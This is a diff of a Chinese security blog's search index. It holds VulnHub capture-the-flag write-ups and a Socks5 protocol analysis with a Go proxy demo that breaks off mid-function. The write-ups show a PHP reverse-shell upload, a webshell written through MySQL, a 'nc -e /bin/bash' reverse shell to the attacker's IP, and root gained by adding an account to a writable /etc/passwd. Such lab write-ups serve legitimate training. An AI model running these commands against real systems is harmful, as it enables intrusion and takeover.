IgnoreSigpipes, LongColumnFlag, FoundRows, Support41Auth, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: KGa5#NB&lt;G/R4L_w\H0YO</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">8080/tcp  open  http        PHP cli server 5.5 or later</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="line">63525/tcp open  http        PHP cli server 5.5 or later</span><br><span class="line">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="line">MAC Address: 00:0C:29:16:3E:01 (VMware)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure>
+
+<p>大致上开启了 <code>80(http)</code> <code>2121(ftp)</code> 端口</p>
+<h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://i.loli.net/2020/09/15/6sczx1kGXMPto7j.png" alt="image-20200915001829728"></p>
+<p>点击<code>pictures</code></p>
+<p><img src="https://i.loli.net/2020/09/15/gJoG9OAPnryvs3U.png" alt="image-20200915001902578"></p>
+<p>以为是<code>sql注入</code>结果手动尝试，并且<code>sqlmap</code>也测试了，并没有注入</p>
+<p><img src="https://i.loli.net/2020/09/15/1jLMHD6zTXm9iV4.png" alt="image-20200915001948217"></p>
+<h3 id="另辟蹊径"><a href="#另辟蹊径" class="headerlink" title="另辟蹊径"></a>另辟蹊径</h3><p>使用<code>dirb</code> 工具扫描网站目录</p>
+<p><img src="https://i.loli.net/2020/09/15/PBzlk1anFNH2Vi5.png" alt="image-20200915002033766"></p>
+<p>找到了这个目录，访问之后是文件上传</p>
+<p>由于没有检查文件后缀名，使用<code>burpsuite</code>抓包绕过检测，成功上传文件，一个<code>php_reverse_shell</code></p>
+<p><img src="https://i.loli.net/2020/09/15/lxBjwWnz5ZLuSky.png" alt="image-20200915002228601"></p>
+<p>通过目录扫描的结果可以得到文件上传的路径<code>http://192.168.6.129/gallery/original/ </code></p>
+<p>访问之后得到shell</p>
+<p><img src="https://i.loli.net/2020/09/15/ktvmBYsoruIbJyX.png" alt="image-20200915002345152"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找能提权的东西，找<code>setuid</code>权限的</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/var/www/html/gallery/maxImageUpload.zip</span><br><span class="line">/var/www/html/gallery/readme.txt</span><br><span class="line">/var/www/html/gallery/style/images/ok.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_bg.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_right.gif</span><br><span class="line">/var/www/html/gallery/style/images/button.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_left.gif</span><br><span class="line">/var/www/html/gallery/style/images/nok.gif</span><br><span class="line">/var/www/html/gallery/style/style.css</span><br><span class="line">/var/www/html/gallery/maxImageUpload.class.php</span><br></pre></td></tr></table></figure>
+
+<p>看到php文件，以为是用php提权，结果发现并不是</p>
+<p>之前有过使用<code>exim4</code>提权的经验，所以尝试<code>exim</code>提权，结果也不是</p>
+<p>无奈偷偷看一眼参考答案，发现<code>/etc/passwd</code>居然可写。。。</p>
+<p><img src="https://i.loli.net/2020/09/15/RstrZGA693aq8mK.png" alt="image-20200915002707980"></p>
+<p>使用<code>openssl passwd -1 -salt stderr 1234</code>生成一个密码，写入一个账户即可</p>
+<p><img src="https://i.loli.net/2020/09/15/SN6MEGUA1qeZwIK.png" alt="image-20200915002803301"></p>
+<p>然后切换用户，得到<code>root</code>权限</p>
+<p><img src="https://i.loli.net/2020/09/15/s7QxtFDOg3TJHc8.png" alt="image-20200915002856988"></p>
+<p>这次的图不是很好看（</p>
+<p><img src="https://i.loli.net/2020/09/15/4Dy5HoJeqx6zXUV.png" alt="image-20200915002917639"></p>
+]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>vulnhub</category>
+        <category>sunset</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>file-upload</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>vulnhub sunset:dawn2靶机</title>
     <url>//sunset-dawn2.html</url>
     <content><![CDATA[<p>vulnhub里的 sunset:dawn2 靶机</p>
@@ -3211,78 +3211,6 @@
       <tags>
         <tag>exploit</tag>
         <tag>stack_overflow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vulnhub sunset:dusk靶机</title>
-    <url>//sunset-dusk.html</url>
-    <content><![CDATA[<p>vulnhub里的 sunset-decoy 靶机</p>
-<p>简单难度</p>
-<a id="more"></a>
-
-<h1 id="sunset-dusk"><a href="#sunset-dusk" class="headerlink" title="sunset:dusk"></a>sunset:dusk</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
-<li>  靶机：<code>192.168.2.2</code></li>
-<li>  攻击机： <code>192.168.2.3</code></li>
-</ul>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>目标靶机开放了<code>21, 22, 25, 80, 3306, 8080</code>端口</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204102852598.png" alt="image-20201204102852598"></p>
-<h2 id="web-attack"><a href="#web-attack" class="headerlink" title="web_attack"></a>web_attack</h2><h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p>访问<code>80</code>端口，是<code>apache</code>的默认页面</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103005406.png" alt="image-20201204103005406">爆破一下目录</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103131440.png" alt="image-20201204103131440"></p>
-<p>啥也没有，看来入口点不是这儿</p>
-<h3 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h3><p>还有一个8080端口，访问一下，发现列出了目录内容和目录路径</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103504978.png" alt="image-20201204103504978"></p>
-<p>应该是在这个地方写webshell了</p>
-<p>但是又没有能够写的地方。</p>
-<h3 id="3306"><a href="#3306" class="headerlink" title="3306"></a>3306</h3><p>尝试一下sql密码的爆破</p>
-<p>结果啪的一下就爆出来了，很快啊</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103642826.png" alt="image-20201204103642826"></p>
-<p>连上去</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103716762.png" alt="image-20201204103716762"></p>
-<p>看一下能否写文件，</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103759529.png" alt="image-20201204103759529"></p>
-<p>发现<code>secure_file_priv</code>这一栏为空，代表任何目录都可以写。那就写入一个webshell</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103943177.png" alt="image-20201204103943177"></p>
-<p>访问<code>http://192.168.2.2:8080/1.php</code></p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104014665.png" alt="image-20201204104014665"></p>
-<p>拿一个反弹shell</p>
-<p><code>http://192.168.2.2:8080/1.php?cmd=nc -e /bin/bash 192.168.2.3 8848</code></p>
-<p>在本机监听端口<code>nc -vlp 8848</code></p>
-<p>接收到一个反弹shell，并使用pty模块</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104215760.png" alt="image-20201204104215760"></p>
-<p>至此，写入了webshell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找一下具有<code>setuid</code>权限的程序</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104326786.png" alt="image-20201204104326786"></p>
-<p>没啥能用的</p>
-<p><code>sudo -l</code></p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104349290.png" alt="image-20201204104349290"></p>
-<p><code>make</code>是可以提权的。</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104432893.png" alt="image-20201204104432893"></p>
-<p>照着做，提权到<code>dusk</code></p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104625718.png" alt="image-20201204104625718"></p>
-<p>直接写入<code>.ssh/authorized_keys</code></p>
-<p>使用ssh登录</p>
-<p>然后就断了，翻找了一下，发现<code>docker</code>能够提权</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104755286.png" alt="image-20201204104755286"></p>
-<p>尝试一下</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104814575.png" alt="image-20201204104814575"></p>
-<p>啊这？</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204105143223.png" alt="image-20201204105143223"></p>
-<h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><p>在尝试提权的过程中，我试着用<code>ps -auxwww</code>命令，查看了一下历史进程</p>
-<p>发现了<code>root</code>运行的<code>ftp</code>的用户名和密码</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104935220.png" alt="image-20201204104935220"></p>
-<p>然后ftp登录上去</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204105020833.png" alt="image-20201204105020833"></p>
-<p>路径是<code>/root</code>，下面的<code>root.txt</code>就是最终的flag，可以get下来。。。</p>
-]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>vulnhub</category>
-        <category>sunset</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>enum</tag>
       </tags>
   </entry>
   <entry>
@@ -3354,6 +3282,78 @@
 <p>本地监听，运行</p>
 <img src="sunset:decoy/image-20200711001746820.png" alt="image-20200711001746820" style="zoom:33%;" />
 
+]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>vulnhub</category>
+        <category>sunset</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>enum</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulnhub sunset:dusk靶机</title>
+    <url>//sunset-dusk.html</url>
+    <content><![CDATA[<p>vulnhub里的 sunset-decoy 靶机</p>
+<p>简单难度</p>
+<a id="more"></a>
+
+<h1 id="sunset-dusk"><a href="#sunset-dusk" class="headerlink" title="sunset:dusk"></a>sunset:dusk</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
+<li>  靶机：<code>192.168.2.2</code></li>
+<li>  攻击机： <code>192.168.2.3</code></li>
+</ul>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>目标靶机开放了<code>21, 22, 25, 80, 3306, 8080</code>端口</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204102852598.png" alt="image-20201204102852598"></p>
+<h2 id="web-attack"><a href="#web-attack" class="headerlink" title="web_attack"></a>web_attack</h2><h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p>访问<code>80</code>端口，是<code>apache</code>的默认页面</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103005406.png" alt="image-20201204103005406">爆破一下目录</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103131440.png" alt="image-20201204103131440"></p>
+<p>啥也没有，看来入口点不是这儿</p>
+<h3 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h3><p>还有一个8080端口，访问一下，发现列出了目录内容和目录路径</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103504978.png" alt="image-20201204103504978"></p>
+<p>应该是在这个地方写webshell了</p>
+<p>但是又没有能够写的地方。</p>
+<h3 id="3306"><a href="#3306" class="headerlink" title="3306"></a>3306</h3><p>尝试一下sql密码的爆破</p>
+<p>结果啪的一下就爆出来了，很快啊</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103642826.png" alt="image-20201204103642826"></p>
+<p>连上去</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103716762.png" alt="image-20201204103716762"></p>
+<p>看一下能否写文件，</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103759529.png" alt="image-20201204103759529"></p>
+<p>发现<code>secure_file_priv</code>这一栏为空，代表任何目录都可以写。那就写入一个webshell</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103943177.png" alt="image-20201204103943177"></p>
+<p>访问<code>http://192.168.2.2:8080/1.php</code></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104014665.png" alt="image-20201204104014665"></p>
+<p>拿一个反弹shell</p>
+<p><code>http://192.168.2.2:8080/1.php?cmd=nc -e /bin/bash 192.168.2.3 8848</code></p>
+<p>在本机监听端口<code>nc -vlp 8848</code></p>
+<p>接收到一个反弹shell，并使用pty模块</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104215760.png" alt="image-20201204104215760"></p>
+<p>至此，写入了webshell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找一下具有<code>setuid</code>权限的程序</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104326786.png" alt="image-20201204104326786"></p>
+<p>没啥能用的</p>
+<p><code>sudo -l</code></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104349290.png" alt="image-20201204104349290"></p>
+<p><code>make</code>是可以提权的。</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104432893.png" alt="image-20201204104432893"></p>
+<p>照着做，提权到<code>dusk</code></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104625718.png" alt="image-20201204104625718"></p>
+<p>直接写入<code>.ssh/authorized_keys</code></p>
+<p>使用ssh登录</p>
+<p>然后就断了，翻找了一下，发现<code>docker</code>能够提权</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104755286.png" alt="image-20201204104755286"></p>
+<p>尝试一下</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104814575.png" alt="image-20201204104814575"></p>
+<p>啊这？</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204105143223.png" alt="image-20201204105143223"></p>
+<h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><p>在尝试提权的过程中，我试着用<code>ps -auxwww</code>命令，查看了一下历史进程</p>
+<p>发现了<code>root</code>运行的<code>ftp</code>的用户名和密码</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104935220.png" alt="image-20201204104935220"></p>
+<p>然后ftp登录上去</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204105020833.png" alt="image-20201204105020833"></p>
+<p>路径是<code>/root</code>，下面的<code>root.txt</code>就是最终的flag，可以get下来。。。</p>
 ]]></content>
       <categories>
         <category>exploit</category>
@@ -3767,6 +3767,19 @@
       </tags>
   </entry>
   <entry>
+    <title>提升交互式shell</title>
+    <url>//upgrade_shell.html</url>
+    <content><![CDATA[<h1 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h1><p><a href="https://www.sohu.com/a/161766202_709042">https://www.sohu.com/a/161766202_709042</a></p>
+]]></content>
+      <categories>
+        <category>exploit</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>tools</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>vulnhub symfonos:2靶机</title>
     <url>//symfonos-2.html</url>
     <content><![CDATA[<p>vulnhub里的 symfonos-2 靶机</p>
@@ -3863,17 +3876,125 @@
       </tags>
   </entry>
   <entry>
-    <title>提升交互式shell</title>
-    <url>//upgrade_shell.html</url>
-    <content><![CDATA[<h1 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h1><p><a href="https://www.sohu.com/a/161766202_709042">https://www.sohu.com/a/161766202_709042</a></p>
+    <title></title>
+    <url>/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Socks5</url>
+    <content><![CDATA[<h1 id="Socks5"><a href="#Socks5" class="headerlink" title="Socks5"></a>Socks5</h1><h2 id="协议分析"><a href="#协议分析" class="headerlink" title="协议分析"></a>协议分析</h2><p>以 <code>proxychains curl google.com</code> 为例</p>
+<h3 id="样例pcap"><a href="#样例pcap" class="headerlink" title="样例pcap"></a>样例pcap</h3><p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20211230214259745.png" alt="image-20211230214259745"></p>
+<p>首先看到 1、2、3 号流量包为 tcp 三次握手。紧接着 5号包为 <code>Socks</code> 协议。</p>
+<blockquote>
+<p>  注：下面的阶段名只是伴随个人理解的命名，并不是协议上真实的命名</p>
+</blockquote>
+<h3 id="协商阶段"><a href="#协商阶段" class="headerlink" title="协商阶段"></a>协商阶段</h3><p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20211230214333848.png" alt="image-20211230214333848"></p>
+<p><code>Socks</code>协议的第一步由两部分组成</p>
+<ol>
+<li>Version<ul>
+<li>  版本号，socks5 就是 0x5</li>
+</ul>
+</li>
+<li>Client Authentication Method<ul>
+<li>  验证方式，socks5协议支持多种校验方式</li>
+<li>  Authentication Method Count：客户端使用多少种校验方式</li>
+<li>  Method[]: 校验方式</li>
+</ul>
+</li>
+</ol>
+<p>随后 <code>Server</code> 回复一个 Socks 包（中间的TCP ACK就忽略了）</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20211230214523682.png" alt="image-20211230214523682"></p>
+<p>也是两部分组成</p>
+<ol>
+<li>Version<ul>
+<li>  版本号，和 <code>Client</code> 发过来的一致</li>
+</ul>
+</li>
+<li>Accept Auth Method<ul>
+<li>  从 <code>Client</code> 的 <code>Method[]</code> 字段里面选取一种校验方式</li>
+</ul>
+</li>
+</ol>
+<p>本样例里面没有验证</p>
+<h3 id="指令阶段"><a href="#指令阶段" class="headerlink" title="指令阶段"></a>指令阶段</h3><p>首先是 <code>Client</code> 告诉 <code>Server</code> 需要代理连接的目标</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20211230215042671.png" alt="image-20211230215042671"></p>
+<ol>
+<li>Version<ul>
+<li>  版本号</li>
+</ul>
+</li>
+<li>Command<ul>
+<li>  指令，包内为 Connect，表示连接</li>
+</ul>
+</li>
+<li>Reserved<ul>
+<li>  保留字段，0x00</li>
+</ul>
+</li>
+<li>Address Type<ul>
+<li>  0x01: IPV4，ipv4地址</li>
+<li>  0x03: Domain，域名</li>
+<li>  0x04: IPV6，ipv6地址</li>
+</ul>
+</li>
+<li>Remote name<ul>
+<li>  目标的域名/ipv4/ipv6</li>
+<li>  如果 <code>Address Type</code> 字段为 <code>Domain</code>，那么第一个字节为域名的长度（样例中为 0x0a）。</li>
+</ul>
+</li>
+<li>Port<ul>
+<li>  目标端口</li>
+</ul>
+</li>
+</ol>
+<p><code>Server</code> 收到请求之后和目标 <code>Remote name:Port</code>尝试建立连接</p>
+<p>而后根据连接的情况返回给 <code>Client</code> 响应包</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20211230215650062.png" alt="image-20211230215650062"></p>
+<ol>
+<li>  Version</li>
+<li>Results<ul>
+<li>  回复类型</li>
+<li>  0x00：Success</li>
+</ul>
+</li>
+<li>Reserved<ul>
+<li>  保留字段</li>
+</ul>
+</li>
+<li>Address Type<ul>
+<li>  地址类型，和请求包里面一样</li>
+</ul>
+</li>
+<li>Remote Address<ul>
+<li>  服务端的ip地址，由于客户端一般用不到这个，所以这个字段无所谓（写成0.0.0.0都没关系）</li>
+</ul>
+</li>
+<li>Port<ul>
+<li>  服务端端口</li>
+</ul>
+</li>
+</ol>
+<p><strong>在实验过程中，不论目标端口是否打开，服务端和目标的连接是否成功，<code>Result</code> 字段都返回了 <code>Success</code>，不知道在什么情况下会返回其他的值？</strong></p>
+<h3 id="转发阶段"><a href="#转发阶段" class="headerlink" title="转发阶段"></a>转发阶段</h3><p>此时的 <code>Server</code> 只作为目标和 <code>Client</code>  的转发器</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20211230220207003.png" alt="image-20211230220207003"></p>
+<h2 id="Sock5-demo"><a href="#Sock5-demo" class="headerlink" title="Sock5_demo"></a>Sock5_demo</h2><p>正好最近在学go， 尝试用 go 写一个demo</p>
+<h3 id="Socket"><a href="#Socket" class="headerlink" title="Socket"></a>Socket</h3><p>首先写一个普通的 Socket</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Process</span><span class="params">(client net.Conn)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ShowErr</span><span class="params">(err error)</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;Error: %s\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	server, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:1080&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		ShowErr(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;listen start\n&quot;</span>)</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		client, err := server.Accept()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			ShowErr(err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">go</span> Process(client)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="协商阶段-1"><a href="#协商阶段-1" class="headerlink" title="协商阶段"></a>协商阶段</h3><p>首先是协商阶段</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	SOCKS5_VERSION 		<span class="keyword">byte</span> = <span class="number">5</span></span><br><span class="line">	AUTH_COUNT  		<span class="keyword">byte</span> = <span class="number">1</span></span><br><span class="line">	AUTH_METHOD 		<span class="keyword">byte</span> = <span class="number">0</span></span><br><span class="line">	ACCEPT_AUTH 		<span class="keyword">byte</span> = <span class="number">0</span></span><br><span class="line">	COMMAND_CONNECT 	<span class="keyword">byte</span> = <span class="number">1</span></span><br><span class="line">	TYPE_IPV4			<span class="keyword">byte</span> = <span class="number">1</span></span><br><span class="line">	TYPE_DOMAIN			<span class="keyword">byte</span> = <span class="number">3</span></span><br><span class="line">	TYPE_IPV6			<span class="keyword">byte</span> = <span class="number">4</span></span><br><span class="line">	RESULT_SUCCESS		<span class="keyword">byte</span> = <span class="number">0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Socks5Auth</span><span class="params">(conn net.Conn)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	reader := bufio.NewReader(conn)</span><br><span class="line">	<span class="keyword">var</span> buf [<span class="number">4</span>]<span class="keyword">byte</span></span><br><span class="line">	n, err := reader.Read(buf[:])</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		ShowErr(err)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> n != <span class="number">3</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;auth length error: %d\n&quot;</span>, n)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> buf[<span class="number">0</span>] != SOCKS5_VERSION || buf[<span class="number">1</span>] != AUTH_COUNT || buf[<span class="number">2</span>] != AUTH_METHOD &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;auth failed, buf: 0x%x, 0x%x, 0x%x\n&quot;</span>, buf[<span class="number">0</span>], buf[<span class="number">1</span>], buf[<span class="number">2</span>])</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;auth success\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> responseBuf = [] <span class="keyword">byte</span> &#123;SOCKS5_VERSION, ACCEPT_AUTH&#125;</span><br><span class="line">	conn.Write(responseBuf)</span><br><span class="line"></span><br><span class="line">	fmt.Printf(<span class="string">&quot;send auth response: 0x%x, 0x%x\n&quot;</span>, responseBuf[<span class="number">0</span>], responseBuf[<span class="number">1</span>])</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先从 socket 里面读取数据，判断是否是 0x05, 0x01, 0x00</p>
+<p>即 <code>SOCKS5_VERSION</code> 、<code>AUTH_COUNT</code>、<code>AUTH_METHOD</code></p>
+<p>也就是不进行验证</p>
+<h3 id="指令阶段-1"><a href="#指令阶段-1" class="headerlink" title="指令阶段"></a>指令阶段</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> RemoteAddress <span class="keyword">struct</span> &#123;</span><br><span class="line">	Domain 	<span class="keyword">string</span></span><br><span class="line">	Ipv4	[]<span class="keyword">byte</span></span><br><span class="line">	Type	<span class="keyword">byte</span></span><br><span class="line">	Port	<span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Socks5SendCommand</span><span class="params">(conn net.Conn, remote *RemoteAddress)</span> <span class="title">net</span>.<span class="title">Conn</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> address <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">if</span> remote.Type == TYPE_DOMAIN &#123;</span><br><span class="line">		address = remote.Domain</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> remote.Type == TYPE_IPV4 &#123;</span><br><span class="line">		address = fmt.Sprintf(<span class="string">&quot;%d.%d.%d.%d&quot;</span>,</span><br><span class="line">			remote.Ipv4[<span class="number">0</span>], remote.Ipv4[<span class="number">1</span>], remote.Ipv4[<span class="number">2</span>], remote.Ipv4[<span class="number">3</span>])</span><br><span class="line">	&#125;</span><br><span class="line">	address = fmt.Sprintf(<span class="string">&quot;%s:%d&quot;</span>, address, remote.Port)</span><br><span class="line">	client, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, address)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		ShowErr(err)</span><br><span class="line">		conn.Close()</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> sendBytes = []<span class="keyword">byte</span> &#123; SOCKS5_VERSION, RESULT_SUCCESS, <span class="number">0x0</span>, TYPE_IPV4, <span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>, <span class="keyword">byte</span>(remote.Port &gt;&gt; <span class="number">8</span>), <span class="keyword">byte</span>(remote.Port) &#125;</span><br><span class="line">	_, err = conn.Write(sendBytes)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		ShowErr(err)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;send command response\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> client</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Socks5RecvCommand</span><span class="params">(conn net.Conn)</span> *<span class="title">RemoteAddress</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> remote = <span class="built_in">new</span>(RemoteAddress)</span><br><span class="line"></span><br><span class="line">	reader := bufio.NewReader(conn)</span><br><span class="line">	<span class="keyword">var</span> buf [<span class="number">128</span>]<span class="keyword">byte</span></span><br><span class="line">	n, err := reader.Read(buf[:])</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		ShowErr(err)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span 